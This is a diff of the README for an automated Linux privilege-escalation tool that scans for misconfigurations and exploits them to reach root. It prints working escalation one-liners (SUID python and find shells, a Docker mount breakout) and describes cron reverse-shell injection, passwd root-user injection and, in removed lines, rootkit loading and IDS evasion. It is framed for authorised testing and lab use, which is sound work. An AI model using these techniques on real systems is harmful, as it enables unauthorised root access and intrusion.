@@ -1,203 +1,129 @@
 <div align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,3,6&height=220&section=header&text=Auto-Privilege&fontSize=60&fontColor=fff&animation=twinkling&desc=Automated%20Linux%20Privilege%20Escalation%20Suite&descSize=18&descAlignY=72" width="100%"/>
-
-  <a href="https://github.com/Ruby570bocadito/Auto-Privilege">
-    <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&weight=600&size=22&pause=1000&color=00FF00&center=true&vCenter=true&width=640&lines=10%2B+Scanners+%7C+60%2B+GTFOBins+Database+%7C+Auto-Root;Zero+Dependencies+%7C+Single+Binary+%7C+Go+Power;From+Peekaboo+to+Auto-Privilege;One+Shot.+One+Binary.+Root." alt="Typing SVG" />
-  </a>
-
-  <br/>
+  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,3,6&height=200&section=header&text=Auto-Privilege&fontSize=58&fontColor=fff&animation=twinkling&desc=Automated%20Linux%20Privilege%20Escalation%20Suite&descSize=18&descAlignY=72" width="100%"/>
 
   <p>
-    <img src="https://img.shields.io/badge/Go-1.26+-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go"/>
-    <img src="https://img.shields.io/badge/Linux-FCC624?style=flat-square&logo=linux&logoColor=black" alt="Linux"/>
-    <img src="https://img.shields.io/badge/Security-Pentest-000000?style=flat-square&logo=kalilinux&logoColor=white" alt="Security"/>
-    <img src="https://img.shields.io/github/license/Ruby570bocadito/Auto-Privilege?style=flat-square&color=blue" alt="License"/>
-    <img src="https://img.shields.io/github/v/release/Ruby570bocadito/Auto-Privilege?style=flat-square&color=brightgreen" alt="Release"/>
-    <img src="https://img.shields.io/github/go-mod/go-version/Ruby570bocadito/Auto-Privilege?style=flat-square&color=purple" alt="Go Version"/>
-    <img src="https://img.shields.io/badge/dependencies-zero-success?style=flat-square" alt="Dependencies"/>
-    <img src="https://img.shields.io/badge/PRs-Welcome-brightgreen?style=flat-square" alt="PRs"/>
+    <a href="./README.es.md">🇪🇸 Español</a> · <b>🇬🇧 English</b>
   </p>
 
-  <br/>
+  <p>
+    <img src="https://github.com/Ruby570bocadito/Auto-Privilege/actions/workflows/ci.yml/badge.svg" alt="CI"/>
+    <img src="https://img.shields.io/badge/Go-1.26+-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go"/>
+    <img src="https://img.shields.io/badge/Linux-FCC624?style=flat-square&logo=linux&logoColor=black" alt="Linux"/>
+    <img src="https://img.shields.io/badge/gtfo-bins_75-blue?style=flat-square" alt="GTFOBins"/>
+    <img src="https://img.shields.io/badge/dependencies-zero-success?style=flat-square" alt="Dependencies"/>
+    <img src="https://img.shields.io/github/license/Ruby570bocadito/Auto-Privilege?style=flat-square&color=blue" alt="License"/>
+    <img src="https://img.shields.io/github/v/release/Ruby570bocadito/Auto-Privilege?style=flat-square&color=brightgreen" alt="Release"/>
+  </p>
 </div>
 
 # ⚠️ Ethical Warning
 
 > **This tool is designed for authorized security testing, CTF competitions, and educational purposes only.**
 >
-> - Only use on systems you own or have explicit written permission to test
+> - Only use it on systems you own or have explicit written permission to test
 > - Misuse may violate local and international laws
 > - The author is not responsible for any damage caused by misuse
->
-> **You have been warned.**
+
+**You have been warned.**
 
 ---
 
 # 🚀 Overview
 
-**Auto-Privilege** is an automated Linux privilege escalation suite that scans a target system, identifies misconfigurations, and **automatically exploits them** to gain root access — all in a **single, statically-linked Go binary with zero dependencies**.
+**Auto-Privilege** is an automated Linux privilege escalation suite: it scans a system for misconfigurations, maps them to exploit techniques and **executes them safest-first** until it gets root — in a **single Go binary with zero dependencies**.
 
-| Phase | Action | Description |
-|-------|--------|-------------|
-| **1. SCAN** | Passive discovery | 10+ vulnerability scanners probe the system (read-only) |
-| **2. ENUMERATE** | Find → Exploit mapping | Matches findings against 60+ GTFOBins database |
-| **3. EXPLOIT** | Auto-root | Executes safest → most aggressive vector until root |
+<p align="center">
+  <img src="docs/images/banner.png" alt="Auto-Privilege banner" width="88%"/>
+</p>
+
+| Phase | Mode | Description |
+|-------|------|-------------|
+| **1 · SCAN** | read-only | 15 passive scanners probe SUID, sudo, cron, capabilities, kernel, credentials… |
+| **2 · ENUMERATE** | read-only | Findings are mapped against a 75-entry GTFOBins database (embedded) |
+| **3 · EXPLOIT** | mutating | Vectors execute safest-first under a `--risk` ceiling; every vector has an off-switch |
+
+Everything the tool *cannot* safely automate is printed as a **manual vector** with the exact command — it never pretends to have executed something it did not.
 
 ---
 
-# 🔢 Features
+# 🎬 Demo
 
-## 10+ Vulnerability Scanners
+The GIF below is a real session inside the **rootless lab** (a user namespace with a fake vulnerable system — no containers, no real root):
+
+<p align="center">
+  <img src="docs/images/demo-lab.gif" alt="Auto-Privilege lab demo" width="88%"/>
+</p>
+
+1. **Scan** the lab: SUID `python3`/`find`, writable cron, writable `/etc/passwd`, readable shadow, systemd hijack, kernel CVE heuristic
+2. **Dry-run**: the exact execution plan, safest first, with every command it would run
+3. **Escalate**: the SUID GTFOBins technique opens a root shell inside the lab (`id` → `uid=0`)
+
+> Reproduce it yourself: `lab/rootless_lab.sh` — details in [Rootless Lab](#-rootless-lab-no-docker-no-root).
+
+---
+
+# ✨ Features
+
+## 15 Scanners (all read-only)
 
 | # | Scanner | Detection | Risk |
 |---|---------|-----------|------|
-| 1 | **SUID Binaries** | Scans 10+ directories for SUID bit | Low |
-| 2 | **Sudo Misconfig** | Parses `sudo -l`, finds NOPASSWD entries | Low |
-| 3 | **Writable Cron** | Checks cron dirs & referenced scripts (world-writable) | Medium |
-| 4 | **Docker Breakout** | Detects docker group membership, suggests escape | High |
-| 5 | **Capabilities** | Reads `/proc/self/status`, finds `cap_setuid`/`cap_sys_ptrace` | Medium |
-| 6 | **NFS no_root_squash** | Parses `/etc/exports`, finds exploitable exports | High |
-| 7 | **Writable PATH** | Checks PATH directories for world-writable locations | Low |
-| 8 | **Systemd Services** | Scans `/etc/systemd/system` for writable service files | Medium |
-| 9 | **/etc/passwd** | Checks if world-writable, injects root user | Critical |
-| 10 | **/etc/shadow** | Checks readability, cracks root hash | Critical |
-| 11 | **Kernel Info** | Grabs kernel version, flags known CVEs (6 CVEs: PwnKit, Baron Samedit, PolaKit, StackRot, nf_tables UAF, packet socket UAF) | Medium |
-| 12 | **Writable Scripts** | Detects world-writable shell scripts in cron/systemd | Medium |
+| 1 | **SUID binaries** | 9 common dirs, GTFOBins cross-check | Low→High |
+| 2 | **sudo rules** | `sudo -n -l` parsing, NOPASSWD + sudo group | High |
+| 3 | **Writable cron** | cron dirs + crontab-referenced scripts | High |
+| 4 | **/etc/passwd** | real write access test (not just mode bits) | High |
+| 5 | **/etc/shadow** | real read/write access test | High/Danger |
+| 6 | **Docker** | group membership + socket writability | High |
+| 7 | **Process caps** | CapEff bitmask decode (setuid/sys_admin/sys_ptrace) | Low→Medium |
+| 8 | **File caps** | `getcap -r` for `cap_setuid+ep` interpreters | Medium |
+| 9 | **NFS exports** | `no_root_squash` in /etc/exports | High |
+| 10 | **Writable PATH** | PATH dirs writable by non-owner | High |
+| 11 | **systemd units** | writable service files | High |
+| 12 | **Kernel CVEs** | version-range match: Dirty Pipe, OverlayFS, StackRot, nf_tables UAF | Medium/High |
+| 13 | **PwnKit** | SUID pkexec (CVE-2021-4034, polkit — not the kernel) | High |
+| 14 | **sudo version** | Baron Samedit (CVE-2021-3156, fixed 1.9.5p2) | High |
+| 15 | **Credentials** | SSH keys, config passwords, history secrets, cloud metadata | Low→High |
 
-## Escalation Techniques
+## Exploitation Techniques
 
-| Technique | How It Works | Auto-Exploit | Risk |
-|-----------|-------------|:---:|:----:|
-| **SUID GTFOBins** | Spawn privileged shell via SUID binary (e.g., `python -c 'import os; os.execl("/bin/sh", "sh")'`) | ✅ | 🟢 SAFE |
-| **Sudo NOPASSWD** | `sudo` via GTFOBins without password | ✅ | 🟢 SAFE |
-| **Cron Injection** | Overwrite writable cron script with reverse shell | ✅ | 🟡 LOW |
-| **Docker Escape** | `docker run -v /:/mnt --privileged` | ✅ | 🟡 MEDIUM |
-| **Capabilities** | `cap_setuid+ep` binary → setuid(0) | ✅ | 🟡 MEDIUM |
-| **NFS no_root_squash** | Mount export as root, write SUID binary | ✅ | 🟡 MEDIUM |
-| **passwd Injection** | Append root user with known hash | ✅ | 🔴 HIGH |
-| **shadow Cracking** | Read hash → muestra hash root para crackear offline | ⚠️ Detect + show | 🔴 HIGH |
-| **PATH Hijack** | Place malicious binary in writable PATH dir | ✅ | 🟡 MEDIUM |
-| **Systemd Hijack** | Replace writable service ExecStart with payload | ✅ | 🟡 MEDIUM |
+| Technique | Auto? | Risk |
+|-----------|:-----:|------|
+| SUID GTFOBins shell (`bash -p`, `python -c 'os.execl…'`) | ✅ | 🟢 Low / 🔴 High |
+| sudo NOPASSWD via GTFOBins technique | ✅ | 🟠 Medium / 🔴 High |
+| sudo ALL → `sudo -i` | ✅ | 🔴 High |
+| Cron injection (reverse shell with your `--lhost/--lport`) | ✅ | 🔴 High |
+| `/etc/passwd` root2 injection (real sha512-crypt hash) | ✅ | 🔴 High |
+| Docker breakout (`-v /:/mnt chroot`) | ✅ | 🔴 High |
+| `cap_setuid+ep` interpreter → `setuid(0)` | ✅ | 🟠 Medium |
+| Shadow read → hash for offline cracking | ✅ (read) | 🔴 High |
+| NFS no_root_squash | 📋 manual | 🔴 High |
+| PATH binary planting | 📋 manual | 🔴 High |
+| systemd ExecStart hijack | 📋 manual | 🔴 High |
+| Kernel CVE exploits | 📋 manual | 🟠/🔴 |
+| Shadow overwrite | 📋 manual | 💀 Danger |
+
+**🟢 SAFE by default**: `--exploit` only runs vectors at or below `--risk=safe` until you raise the ceiling — the tool errs on the side of doing nothing destructive.
 
 ---
 
 # 📦 Quick Start
 
-### Installation
-
 ```bash
-# Option A: Go install (requires Go 1.26+)
-go install github.com/Ruby570bocadito/Auto-Privilege@latest
-
-# Option B: Git clone & build
 git clone https://github.com/Ruby570bocadito/Auto-Privilege.git
 cd Auto-Privilege
-go build -o Auto-Privilege .
+go build -o autoprivilege .
 
-# Option C: Download pre-built binary from Releases
+# read-only audit of this machine (safe: changes nothing)
+./autoprivilege
+
+# show the execution plan without running anything
+./autoprivilege --exploit --dry-run --risk=medium
+
+# auto-exploit, safest techniques first
+./autoprivilege --exploit --risk=low
 ```
 
-### Basic Usage
-
-```bash
-# Scan only (safe, read-only)
-./Auto-Privilege
-
-# Auto-exploit found vectors
-./Auto-Privilege --exploit
-
-# Auto-exploit with risk limit
-./Auto-Privilege --exploit --risk=medium
-
-# Specific vectors only
-./Auto-Privilege --vector=suid,sudo,cron
-
-# JSON output for automation
-./Auto-Privilege --json
-
-# Quiet mode (exit code: 0=root, 1=fail)
-./Auto-Privilege --quiet
-```
-
----
-
-# 🧠 Architecture
-
-```mermaid
-flowchart LR
-    A["🎯 Target System"] --> B["🔍 Scanner Engine"]
-    B --> C["10+ Checks<br/>SUID · Sudo · Cron<br/>Docker · NFS · PATH"]
-    C --> D{"Vulnerability<br/>Detected?"}
-    D -->|"❌ No"| E["Report Findings"]
-    D -->|"✅ Yes"| F["GTFOBins Matcher<br/>60+ Binaries"]
-    F --> G["Risk Evaluator"]
-    G --> H["🟢 SAFE"] --> K["Auto-Exploit"]
-    G --> I["🟡 MEDIUM"] --> K
-    G --> J["🔴 HIGH/DANGER"] --> K
-    K --> L["💀 Root Shell<br/>or SUID Binary"]
-```
-
-## File Structure
-
-```
-Auto-Privilege/
-├── main.go                 CLI entry + orchestration
-├── scanner.go              10+ vulnerability scanners
-├── enumerate.go            Findings → exploit vector mapping
-├── exploit.go              Exploitation engine (safe→danger)
-├── gtfobins.go             Embedded GTFOBins database (~60 binaries)
-├── gtfobins_update.go      GTFOBins updater from upstream
-├── logger.go               Logging and output formatting
-├── universe.go             Types, constants, formatting
-├── autoprivilege_test.go        Unit tests (9 tests)
-├── docker/
-│   ├── Dockerfile.vulnerable    Target with 10 deliberate flaws
-│   ├── Dockerfile.clean         Secure baseline system
-│   ├── Dockerfile.edgecases     Edge case scenarios
-│   ├── docker-compose.yml       Test network
-│   └── test_runner.sh           Automated test runner
-└── README.md
-```
-
----
-
-# 🐳 Docker Testing
-
-```bash
-# Build all images
-cd docker
-docker compose build
-
-# Start test network (vulnerable + clean + edgecases)
-docker compose up -d
-
-# Run Auto-Privilege on vulnerable target
-docker exec autoprivilege-vulnerable ./Auto-Privilege --exploit
-
-# Run on clean system (should find minimal vectors)
-docker exec autoprivilege-clean ./Auto-Privilege
-
-# Run edge case scenarios
-docker exec autoprivilege-edgecases ./Auto-Privilege --vector=sudo
-
-# Full test suite
-./docker/test_runner.sh
-```
-
----
-
-# 🎯 GTFOBins Database
-
-**60+ binaries** with exploitation commands, **embedded in the binary**. Zero network calls at runtime. Works air-gapped.
-
-<details>
-<summary><b>Click to expand — all supported binaries</b></summary>
-
-**Shell interpreters (SUID):** python, python2, python3, python3.8-3.13, perl, perl5, php, php5-8.2, ruby, ruby2-3, lua, lua5.3-5.4, node, nodejs, bash, dash, zsh, ksh, fish, sh
-
-**Sudo-capable binaries:** find, vim, vi, less, more, man, awk, gawk, nawk, sed, gdb, nmap, tcpdump, tar, zip, unzip, rsync, scp, socat, env, nice, timeout, stdbuf, watch, make, pip, pip3, npm, gem, git, ssh, docker, lxc, apache2, cpan, ed, ex, ftp, wall, systemctl, journalctl, mysql, psql, sqlite3
-
-</details>
+Requires Go 1.26+ to build. The binary is static and runs anywhere on Linux.
 
 ---
 
@@ -205,47 +131,157 @@ docker exec autoprivilege-edgecases ./Auto-Privilege --vector=sudo
 
 | Command | Description |
 |---------|-------------|
-| `./Auto-Privilege` | Scan only (no exploit) |
-| `./Auto-Privilege --exploit` | Auto-exploit safest vector first |
-| `./Auto-Privilege --exploit --risk=safe` | Only SAFE risk vectors |
-| `./Auto-Privilege --exploit --risk=danger` | Everything (including dangerous) |
-| `./Auto-Privilege --vector=suid,sudo,cron` | Specific vectors only |
-| `./Auto-Privilege --exploit --one-shot` | Stop after first success |
-| `./Auto-Privilege --json` | Machine-readable JSON output |
-| `./Auto-Privilege --quiet` | Exit code only (0=root, 1=fail) |
-| `./Auto-Privilege --rooteame ./rootkit.ko` | Load rootkit on success |
-| `./Auto-Privilege --stealth` | Slow scan (evades IDS) |
-| `./Auto-Privilege --dry-run` | Scan & enumerate only, no exploitation |
-| `./Auto-Privilege --update-gtfobins` | Update embedded GTFOBins database |
-| `./Auto-Privilege --lhost 10.0.0.1` | Set listener IP for reverse shells |
-| `./Auto-Privilege --lport 4444` | Set listener port for reverse shells |
-| `./Auto-Privilege --log json` | JSON log format (default: text) |
+| `./autoprivilege` | read-only scan + enumerate |
+| `./autoprivilege --exploit` | auto-exploit (SAFE ceiling by default) |
+| `./autoprivilege --exploit --risk=medium` | raise the risk ceiling |
+| `./autoprivilege --exploit --dry-run` | print the plan, execute nothing |
+| `./autoprivilege --vector=suid,sudo,cron` | focus specific vectors |
+| `./autoprivilege --exploit --one-shot` | stop after first success |
+| `./autoprivilege --json` | machine-readable report on stdout |
+| `./autoprivilege --report audit.md` | markdown evidence report |
+| `./autoprivilege --list-gtfo` | dump the embedded GTFOBins database |
+| `./autoprivilege --update-gtfobins` | refresh the DB from upstream (persisted to `~/.autoprivilege/`) |
+| `./autoprivilege --quiet` | exit code only: **0 = root, 1 = no root** |
+| `./autoprivilege --stealth` | jitter between scanners/exploits |
+| `./autoprivilege --lhost 10.0.0.1 --lport 4444` | reverse-shell listener for cron injection |
+| `./autoprivilege --no-color` | disable colors (auto-off when piped, honors `NO_COLOR`) |
+| `./autoprivilege --verbose` / `--log json` | stderr diagnostics |
+| `./autoprivilege --version` / `--help` | metadata / full help |
+
+**Exit codes:** `0` root or scan-only · `1` exploit ran without root · `2` usage error.
+
+---
+
+# 🧪 Rootless Lab (no Docker, no root)
+
+`lab/rootless_lab.sh` builds a **fake vulnerable system inside a user namespace** (`unshare -r -m`):
+
+- `/etc` is bind-mounted from a temp dir: writable passwd/shadow, writable cron job, writable systemd unit
+- `/usr/bin` is bind-mounted from a temp copy with SUID `python3` and `find`
+- The SUID bits only grant the *namespace's* mapped root — your system is never touched
+
+```bash
+./lab/rootless_lab.sh                             # scan the lab
+./lab/rootless_lab.sh --exploit --dry-run --risk=danger
+./lab/rootless_lab.sh --shell                     # shell inside the lab
+```
+
+Inside the lab shell, run the GTFOBins technique yourself and watch it land:
+
+```bash
+/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+id    # uid=0(root) — inside the namespace
+```
+
+Requires `unshare` (util-linux) and user namespaces enabled. No docker, no sudo, no root — perfect for demos, classes and CI.
+
+---
+
+# 🐳 Docker Testing
+
+```bash
+cd docker
+docker compose build && docker compose up -d
+
+docker exec autoprivilege-vulnerable /usr/local/bin/autoprivilege
+docker exec autoprivilege-clean /usr/local/bin/autoprivilege
+docker exec autoprivilege-edgecases /usr/local/bin/autoprivilege --vector=sudo
+
+# full suite (build, tests, json validation, false-positive checks, flag smoke tests)
+./docker/test_runner.sh
+```
+
+Three targets: **vulnerable** (10 deliberate flaws), **clean** (baseline — must produce zero false positives), **edgecases** (tricky configurations).
+
+---
+
+# 🎯 GTFOBins Database
+
+**75 techniques embedded in the binary** — zero network calls at runtime, works air-gapped.
+
+<details>
+<summary><b>Supported binaries</b></summary>
+
+**SUID shell (31):** bash, dash, fish, ksh, lua, lua5.3, lua5.4, node, nodejs, perl, perl5, php, php5, php7, php8, php8.1, php8.2, python, python2, python3, python3.8–3.13, ruby, ruby2, ruby3, sh, zsh
+
+**sudo (44):** apache2, awk, cpan, docker, ed, env, ex, find, ftp, gawk, gdb, gem, git, journalctl, less, lxc, make, man, more, mysql, nawk, nice, nmap, npm, pip, pip3, psql, rsync, scp, sed, socat, sqlite3, ssh, stdbuf, systemctl, tar, tcpdump, timeout, unzip, vi, vim, wall, watch, zip
+
+</details>
+
+`--update-gtfobins` fetches upstream GTFOBins, merges new entries and **persists them** to `~/.autoprivilege/gtfobins.json` (loaded automatically on the next run).
+
+---
+
+# 📤 Output Formats
+
+**JSON** (`--json`) — clean stdout, colors auto-disabled, safe to pipe:
+
+```json
+{
+  "tool": "Auto-Privilege",
+  "version": "1.1.0",
+  "host": "target",
+  "user": "operator",
+  "timestamp": "2026-09-11T10:30:00Z",
+  "duration_ms": 1420,
+  "rooted": false,
+  "findings": [ { "source": "SUID", "target": "/usr/bin/find", "risk": "LOW", "exploitable": true } ],
+  "vectors":  [ { "name": "SUID find", "command": "find . -exec /bin/sh -p \\; -quit" } ]
+}
+```
+
+**Markdown** (`--report audit.md`) — findings table + every vector with its exact command, ready to attach to an engagement report.
+
+---
+
+# 🧠 Architecture
+
+```mermaid
+flowchart LR
+    A["🎯 Target System"] --> B["🔍 Phase 1 · Scan<br/>15 read-only scanners"]
+    B --> C["🗂️ Phase 2 · Enumerate<br/>findings × GTFOBins(75)"]
+    C --> D{"Vector?"}
+    D -->|auto| E["⚡ Phase 3 · Exploit<br/>safest-first, risk ceiling"]
+    D -->|manual| F["📋 Print exact command"]
+    E --> G{"root?"}
+    G -->|yes| H["💀 Report + summary"]
+    G -->|no| E
+```
+
+```
+Auto-Privilege/
+├── main.go                 CLI entry + orchestration + exit codes
+├── ui.go                   banner, help, dry-run plan, summary, GTFOBins list
+├── report.go               JSON report + markdown evidence report
+├── scanner.go              15 read-only scanners (+ honest CVE heuristics)
+├── enumerate.go            findings → exploit vectors (auto + manual)
+├── exploit.go              execution engine (safest-first, interactive/captured)
+├── gtfobins.go             embedded GTFOBins database (75 entries)
+├── gtfobins_update.go      upstream refresh with real persistence
+├── logger.go               stderr diagnostics (text/json)
+├── universe.go             types, risk levels, TTY-aware colors
+├── autoprivilege_test.go   20+ unit tests (banner decode, parsing, ranges…)
+├── lab/rootless_lab.sh     rootless demo lab (user namespace)
+├── docker/                 vulnerable / clean / edgecases targets + runner
+└── docs/images/            banner + demo GIF (real sessions)
+```
 
 ---
 
 # 📊 Risk Levels
 
-| Level | Examples | Auto-Exploit? | FS Changes? |
+| Level | Examples | Auto-exploit | FS changes |
 |-------|----------|:---:|:---:|
-| 🟢 **SAFE** | python SUID → shell | ✅ Yes | No |
-| 🟡 **LOW** | find SUID, awk sudo | ✅ Yes | Minor |
-| 🟠 **MEDIUM** | cap_sys_ptrace, cron inject | ⚠️ Optional | May trigger alerts |
-| 🔴 **HIGH** | passwd injection, cron, docker | ⚠️ Optional | Yes |
-| 💀 **DANGER** | shadow overwrite, kernel exploits | ✋ Manual only | Yes, may crash |
+| 🟢 **SAFE** | GTFOBins SUID → shell | ✅ default | No |
+| 🔵 **LOW** | `find -exec` SUID | ✅ with `--risk=low` | No |
+| 🟠 **MEDIUM** | cap_setuid, kernel heuristics | ✅ with `--risk=medium` | No |
+| 🔴 **HIGH** | cron injection, passwd write, docker | ✅ with `--risk=high` | Yes |
+| 💀 **DANGER** | shadow overwrite | 📋 manual only | Yes, risky |
 
 ---
 
 <div align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,3,6&height=120&section=footer&text=Root%20the%20box%20%E2%80%A2%20One%20shot&fontSize=24&fontColor=fff&animation=twinkling" width="100%"/>
+  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=0,2,3,6&height=110&section=footer&text=One%20binary.%20One%20shot.%20Root.&fontSize=22&fontColor=fff&animation=twinkling" width="100%"/>
   <br/><br/>
-  <sub>Built with ❤️ by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a></sub>
-  <br/>
-  <sub>Formerly known as <strong>Peekaboo</strong> — Now <strong>Auto-Privilege</strong></sub>
-  <br/><br/>
-  <img src="https://img.shields.io/badge/Go-1.26+-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go"/>
-  <img src="https://img.shields.io/badge/Linux-red?style=flat-square&logo=linux&logoColor=white" alt="Linux"/>
-  <img src="https://img.shields.io/github/stars/Ruby570bocadito/Auto-Privilege?style=flat-square&color=yellow" alt="Stars"/>
-  <img src="https://img.shields.io/github/last-commit/Ruby570bocadito/Auto-Privilege?style=flat-square&color=blue" alt="Last Commit"/>
-  <br/><br/>
-  <sub>© 2026 Ruby570bocadito. MIT License.</sub>
+  <sub>Built with ❤️ by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a> · © 2026 · MIT License</sub>
 </div>
